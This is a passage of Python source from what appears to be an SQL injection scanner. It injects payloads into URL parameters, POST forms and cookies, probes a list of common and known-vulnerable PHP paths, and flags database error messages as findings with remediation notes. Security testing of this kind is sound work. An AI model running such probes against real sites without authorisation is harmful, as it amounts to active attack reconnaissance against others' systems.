            param_name: The parameter name
            param_value: The parameter value
            method: HTTP method (get or post)
            semaphore: Semaphore to limit concurrent requests
            timeout: Request timeout
            
        Returns:
            The response text if successful, None otherwise
        """
        try:
            # Create a modified URL with the payload for GET requests
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # Make a copy of the query parameters
            new_params = {k: v.copy() if isinstance(v, list) else [v] for k, v in query_params.items()}
            
            # Modify the target parameter
            if param_name in new_params:
                new_params[param_name] = [param_value]
            else:
                new_params[param_name] = [param_value]
            
            # Reconstruct the URL for GET requests
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Make the request
            async with semaphore:
                client_timeout = aiohttp.ClientTimeout(total=timeout)
                async with aiohttp.ClientSession(timeout=client_timeout) as session:
                    if method.lower() == "post":
                        # For POST requests, send the payload in the form data
                        form_data = {k: v[0] if isinstance(v, list) and v else v for k, v in new_params.items()}
                        try:
                            async with session.post(url, data=form_data, ssl=False) as response:
                                return await response.text()
                        except aiohttp.ClientConnectorError as e:
                            print(f"Connection error for POST request to {url}: {str(e)}")
                            return None
                        except aiohttp.ClientResponseError as e:
                            print(f"Response error for POST request to {url}: {str(e)}")
                            return None
                        except asyncio.TimeoutError:
                            # Rethrow timeout errors for blind SQL injection testing
                            raise
                        except Exception as e:
                            print(f"Unexpected error for POST request to {url}: {str(e)}")
                            return None
                    else:
                        # For GET requests, send the payload in the URL
                        try:
                            async with session.get(new_url, ssl=False) as response:
                                return await response.text()
                        except aiohttp.ClientConnectorError as e:
                            print(f"Connection error for GET request to {new_url}: {str(e)}")
                            return None
                        except aiohttp.ClientResponseError as e:
                            print(f"Response error for GET request to {new_url}: {str(e)}")
                            return None
                        except asyncio.TimeoutError:
                            # Rethrow timeout errors for blind SQL injection testing
                            raise
                        except Exception as e:
                            print(f"Unexpected error for GET request to {new_url}: {str(e)}")
                            return None
        
        except asyncio.TimeoutError:
            # Let the timeout propagate up for blind SQL injection testing
            raise
        except Exception as e:
            print(f"Error preparing request for {url} with parameter {param_name}={param_value}: {str(e)}")
            return None 

    async def _generate_test_urls(self, base_url: str, semaphore: asyncio.Semaphore) -> List[str]:
        """
        Generate additional URLs to test based on the main URL.
        
        Args:
            base_url: The base URL
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of additional URLs to test
        """
        try:
            parsed_url = urlparse(base_url)
            base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
            additional_urls = []
            
            # Check if there's a query parameter already
            if parsed_url.query:
                # Try adding an 'id' parameter if it doesn't exist
                query_params = parse_qs(parsed_url.query)
                if 'id' not in query_params:
                    new_url = f"{base_url}&id=1"
                    additional_urls.append(new_url)
            
            # Common endpoints that might have SQL injection vulnerabilities
            common_endpoints = [
                "/search.php",
                "/listproducts.php?cat=1",
                "/artists.php?artist=1",
                "/product.php?id=1",
                "/userinfo.php",
                "/details.php?id=1",
                "/article.php?id=1",
                "/item.php?id=1",
                "/profile.php?id=1",
                "/category.php?id=1",
                "/view.php?id=1",
                "/content.php?id=1",
                "/news.php?id=1",
                "/event.php?id=1"
            ]
            
            # Add the common endpoints to the additional URLs
            for endpoint in common_endpoints:
                test_url = f"{base_domain}{endpoint}"
                additional_urls.append(test_url)
            
            # Remove duplicates and the original URL
            unique_urls = [url for url in additional_urls if url != base_url]
            
            # Verify URLs are accessible before returning them
            verified_urls = []
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    for url in unique_urls:
                        try:
                            async with session.get(url, timeout=5, ssl=False) as response:
                                if response.status == 200:
                                    verified_urls.append(url)
                        except Exception:
                            continue
            
            return verified_urls
        except Exception as e:
            print(f"Error generating test URLs: {str(e)}")
            return []
            
    async def _test_known_vulnerable_paths(self, base_url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test known vulnerable paths for SQL injection.
        
        Args:
            base_url: The base URL
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        try:
            parsed_url = urlparse(base_url)
            base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Specific paths on testphp.vulnweb.com and similar sites known to be vulnerable
            known_paths = [
                # Key paths with injectable parameters
                "/listproducts.php?cat=1",  # Vulnerable parameter: cat
                "/artists.php?artist=1",    # Vulnerable parameter: artist
                "/product.php?id=1",        # Vulnerable parameter: id
                "/userinfo.php",            # Vulnerable form parameters
                "/search.php?test=query",   # Vulnerable parameter: searchFor
                "/categories.php?id=1",     # Vulnerable parameter: id
                "/guestbook.php",           # Vulnerable parameter: name
                "/secured/newuser.php"      # Vulnerable signup form
            ]
            
            for path in known_paths:
                test_url = f"{base_domain}{path}"
                print(f"Testing known vulnerable path: {test_url}")
                
                # For URLs with parameters, test them directly
                if '?' in path:
                    # Extract parameter name from the URL
                    parsed_path = urlparse(path)
                    query_params = parse_qs(parsed_path.query)
                    
                    for param_name in query_params:
                        for payload in random.sample(self.error_payloads, min(3, len(self.error_payloads))):
                            vulnerable_url = test_url.replace(f"{param_name}=1", f"{param_name}={payload}")
                            
                            try:
                                async with semaphore:
                                    async with aiohttp.ClientSession() as session:
                                        async with session.get(vulnerable_url, timeout=10, ssl=False) as response:
                                            if response.status == 200:
                                                content = await response.text()
                                                
                                                # Check for SQL error patterns
                                                for pattern in self.sql_error_patterns:
                                                    if re.search(pattern, content, re.IGNORECASE):
                                                        vulnerabilities.append({
                                                            "id": str(uuid.uuid4()),
                                                            "name": "SQL Injection in Known Vulnerable Path",
                                                            "description": f"SQL injection vulnerability detected in {path} parameter: {param_name}",
                                                            "severity": "high",
                                                            "location": test_url,
                                                            "evidence": f"Parameter '{param_name}' with payload '{payload}' triggered error pattern: {pattern}",
                                                            "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                                                        })
                                                        break
                            except Exception:
                                continue
                # For URLs without parameters, check for forms
                else:
                    form_check_results = await self._check_forms(test_url, semaphore)
                    if form_check_results:
                        vulnerabilities.extend(form_check_results)
            
        except Exception as e:
            print(f"Error testing known vulnerable paths: {str(e)}")
        
        return vulnerabilities
        
    async def _check_cookies(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check cookies for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # First, get cookies from the site
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, ssl=False) as response:
                        # Get cookies from the response
                        cookies = response.cookies
                        if not cookies:
                            return []
                        
                        baseline_text = await response.text()
                        
                        # Test each cookie
                        for cookie_name in cookies:
                            # Test with SQL injection payloads
                            for payload in random.sample(self.error_payloads, min(3, len(self.error_payloads))):
                                # Create a cookie with the payload
                                cookie = {cookie_name: payload}
                                
                                # Send request with the modified cookie
                                try:
                                    async with session.get(url, cookies=cookie, timeout=10, ssl=False) as cookie_response:
                                        cookie_text = await cookie_response.text()
                                        
                                        # Check for SQL error patterns
                                        for pattern in self.sql_error_patterns:
                                            if re.search(pattern, cookie_text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                                                vulnerabilities.append({
                                                    "id": str(uuid.uuid4()),
                                                    "name": "SQL Injection in Cookie",
                                                    "description": f"SQL injection vulnerability detected in cookie: {cookie_name}",
                                                    "severity": "high",
                                                    "location": url,
                                                    "evidence": f"Cookie '{cookie_name}' with payload '{payload}' triggered error pattern: {pattern}",
                                                    "remediation": "Validate and sanitize all cookie values. Use parameterized queries when using cookie data in database operations."
                                                })
                                                break
                                except Exception as e:
                                    print(f"Error testing cookie {cookie_name}: {str(e)}")
                                    continue
        
        except Exception as e:
            print(f"Error checking cookies for SQL injection: {str(e)}")
        
        return vulnerabilities 